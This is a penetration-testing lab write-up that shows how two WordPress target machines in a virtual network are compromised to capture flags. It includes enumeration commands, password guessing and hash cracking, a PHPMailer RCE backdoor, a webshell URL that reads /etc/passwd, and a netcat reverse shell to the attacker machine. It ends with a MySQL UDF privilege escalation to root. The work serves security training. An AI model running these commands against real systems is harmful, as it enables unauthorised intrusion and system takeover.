# pentest_example
This exercise demonstrates penetration testing and reporting.
This activity was part of a larger project, but highlights finding, gaining access to, and exploiting servers running Wordpress sites.


The following are the vulnerabilities that were exploited in this attack:
  - [Wordpress Enumeration CVE-2019-6579](https://nvd.nist.gov/vuln/detail/CVE-2019-6579) - using wpscan, nikto, and gobuster
  - Weak passwords - easy to guess/bruteforce
  - Unprotected and Unsalted Hashes - cracked using johntheripper
  - Root privileges on user 'steven' for Python
  - [Remote Code Execution Vulnerability in PHPMailer 5.2.16 CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)
  - [MySQL 5.x User Defined Functions (UDF) Vulnerability CVE-2005-2572](https://nvd.nist.gov/vuln/detail/CVE-2005-2572)
   

This document contains a step by step walkthrough of the attack process including the commands used, and screenshots of the command line.

### Description of the Topology

The exploit took place on the network depicted below.

![Diagram of virtual network](Target_1_Screenshots/network_topology.jpg)

The Kali machine was used to connect to each of the servers individually and through a variety of exploits gain root access to each server and capture flags.

### Target 1 Exploitation

The first step was finding out our network information.

![network](Target_1_Screenshots/find_network.jpg)

Then using nmap to scan the machine and identifying what services were running. 
On the Kali machine, nmap was used to identify the machine and its services.

![nmap command](Target_1_Screenshots/nmap_results.jpg)

![nmap command](Target_1_Screenshots/nmap_results2.jpg)

![nmap command](Target_1_Screenshots/nmap_results3.jpg)

The scan revealed ports 22, 80, 111, 139, and 445 were open on Target 1 machine

Next using metasploit, we ran a services and vulnerabilites scan to determine if there was any other useful information:

![services](Target_1_Screenshots/macs_and_services.jpg)

![vuln](Target_1_Screenshots/vulnerabilities.jpg)

This search yeilded nothing particularly valuable.
We then used 'wpscan' command to enumerate the server using the command
```
wpscan --url http://192.168.1.110/wordpress -eu
```
![wpscan](Target_1_Screenshots/wordpress_scan.jpg)

![wpscan](Target_1_Screenshots/wordpress_scan2.jpg)

This gave us a more detailed look at the users who have access to the server. Because we had usernames, we were able to guess/brute force the password to use ssh to connect to the machine. We guessed user 'michael' was using password 'michael' which is a pretty silly thing to do, but a great example of a very weak password.
As a result, we were able to log into the server using ssh, since we had already established that port 22 was open on the machine.

![ssh_michael](Target_1_Screenshots/michael.jpg)

Next, we looked for flags:

![flag1](Target_1_Screenshots/flag1.jpg)

![flag2](Target_1_Screenshots/flag2.jpg)

Afterwards, we decided to investigate what we could on the machine, and discovered a 'wp-config' file which had an unencrypted username and password for a myql database on the machine.

![wp-config](Target_1_Screenshots/wp-config.jpg)

Using the credentials obtained, we opened the myql server using the command
```
mysql -u root -p
```
and entered the password 'R@v3nSecurity'

![mysql_access](Target_1_Screenshots/mysql_access.jpg)

Exploring the mysql database, we were able to discover both the third flag, but exploring various directories, as well as find password hashes for both user 'steven' and 'michael' using the command
```
SELECT * FROM wp_users;
```

![flag3](Target_1_Screenshots/flag3.jpg)

![mysql command](Target_1_Screenshots/wp_users.jpg)

Next we copied the hash values into a text file called 'wp_hashes.txt', and the used johntheripper to decrypt the hash values using command:
```
john wp_hashes.txt
```
![john command](Target_1_Screenshots/johntheripper.jpg)

Finally, using user 'steven' password 'pink84' we used ssh to gain access to the server to gain root privilege. First identifying user priviliges, and the exploiting root access to python using the command
```
sudo python -c 'import pty;pty.spawn("/bin/bash");'
```
![escalation](Target_1_Screenshots/escalation.jpg)


### Target 2 Exploitation
Again, using the network information obtained from our earlier search we identified the ip address of Target 2 machine.
Using nmap to scan the machine and identifying what services were running. 
![nmap command](Target_2_Screenshots/nmap_sscan.jpg)

The scan revealed ports 22, 80, 111, 139, and 445 were open on Target 2 machine as well.

Next using nikto and then gobuster, the server was enumerated to determine whether wordpress was running, and to determine any interesting directories.

![nikto command](Target_2_Screenshots/nikto.jpg)

![gobuster](Target_2_Screenshots/gobuster.jpg)

The "vendor" folder was a good place to check using a browser

![vendor](Target_2_Screenshots/noflag.jpg)

In this directory, we found the first flag, but also information about the version of PHPMailer that was currently running on the system.

![flag1](Target_2_Screenshots/flag1.jpg)

![php](Target_2_Screenshots/php_version.jpg)

Using the information on the PHPMailer version, a search was conducted using searchsploit to find any vulnerabilites or scripts that could be use to gain further access to the server.

![searchsploit](Target_2_Screenshots/searchsploit_phpmailer.jpg)

A remote code execution script was available that could be used to create a backdoor on the server.

![searchsploit](Target_2_Screenshots/php_exploit_detail.jpg)

Using a pre-built script, uploading it to http://pastebin.com and then downloading it on the Kali machine, the script was edited to include the ip address of the Target 2 machine.

![exploit](Target_2_Screenshots/edit_exploit.jpg)

Next the file must be made executable

![chmodexploit](Target_2_Screenshots/chmod_exploit.jpg)

Running the script executes command injection, which allows for backdoor access to the server by exploiting [Remote Code Execution Vulnerability in PHPMailer 5.2.16 CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

Running the script, and then using the following line in the url bar of the browser allowed us to test the backdoor
``` 
192.168.1.115/backdoor.php?cmd=cat /etc/passwd
```

![exploitsuccess](Target_2_Screenshots/exploit_browser.jpg)

Next, using the backdoor.php we called the Kali machine to gain shell access to the Target 2 machine
First we used netcat to listen on port 4444 using the command
```
nc  -lnvp 4444
```

![listen](Target_2_Screenshots/listner_4444.jpg)

Then used the url bar to run the reverse shell by calling the Kali machine on port 4444
```
192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 4444 /bin/bash
```

![bash](Target_2_Screenshots/run_bash_shell_browser.jpg)

![shellsuccess](Target_2_Screenshots/shell_sucess.jpg)

![shellsuccess](Target_2_Screenshots/shell_sucess1.jpg)

We found the 2nd and 34d flag from there.

![flag2](Target_2_Screenshots/flag2.jpg)

![findflag3](Target_2_Screenshots/find_flag3.jpg)

![flag3](Target_2_Screenshots/flag3.jpg)

We used the same privilege escalation using the user python root privilges, but for the purpose of being able to see the shell more easily
```
sudo python -c 'import pty;pty.spawn("/bin/bash");'
```

![python command](Target_2_Screenshots/python_access.jpg)

The www-data user did not have root privilges, therefore we needed to find another way to gain root access.
We were able to determine that the machine was also running a mysql database using a netstat discover command
```
netstat -tl
```

![netstat](Target_2_Screenshots/netstat_discover.jpg)

We guessed, correctly, that the mysql credentials from Target 1 were the same as this machine user: root password: R@v3nSecurity
Using the following command we were able to determine version information on the mysql database which could be potentially exploited
```
show variables like "%version%";
```

![mysql](Target_2_Screenshots/mysql_database.jpg)

Using searchsploit, and the Mysql version 5.0 information, we were able to find an exploit labeled 1518.c [MySQL 5.x User Defined Functions (UDF) Vulnerability CVE-2005-2572](https://nvd.nist.gov/vuln/detail/CVE-2005-2572) The exploit allows a user to change a command line function inside the msyql databse, and then alter the command to gain root access

![1518](Target_2_Screenshots/exploit_1518.jpg)

![1518](Target_2_Screenshots/1518_detail.jpg)


First the exploit needed to be encoded and then changed into a format that could be executed. Some googling and finding previous users who had done this was very helpful. The commands used are as follows.
To encode the exploit
```
searchsploit -m 1518.c
```

To change the format from .c to .so
```
gcc -g -shared -Wl -soname,1518.so -o 1518.so 1518.c -lc
```

![encode](Target_2_Screenshots/encode_exploit.jpg)

![modify type](Target_2_Screenshots/change_format_exploit.jpg)


Getting the exploit loaded on to the Target 2 machine was challenging.
In one command line window netcat was used to send the 1518.so file over port 1499 and in a separate command line window the exploit was received on the Target 2 machine using netcat on port 1499 and written as escalation.so. Once it was verified that the file was on the Target 2 machine, chmod command was used to make it executable.

![netcat](Target_2_Screenshots/netcat1.jpg)

![netcat](Target_2_Screenshots/netcat2.jpg)

![chmod](Target_2_Screenshots/chmod_escalation.jpg)

Next we logged back in to the mysql database on Target 2, and the database updated. Next we modify the database to create a new table called “foo” which we then embed our exploit called ‘escalation.so’ in order to create a vulnerability in the “find” command.

![mysql](Target_2_Screenshots/changed_database.jpg)

![create vuln](Target_2_Screenshots/create_find_vuln.jpg)

Next we logged out of the msyql database, ran a command to create a file called burrito, because why not?
Lastly we used the find command to gain root privilges, and the captured the final flag. 
```
find burrito -exec "whoami" \;
```

``` 
find burrito -exec "/bin/sh" /;
```

![root](Target_2_Screenshots/root_escalation.jpg)



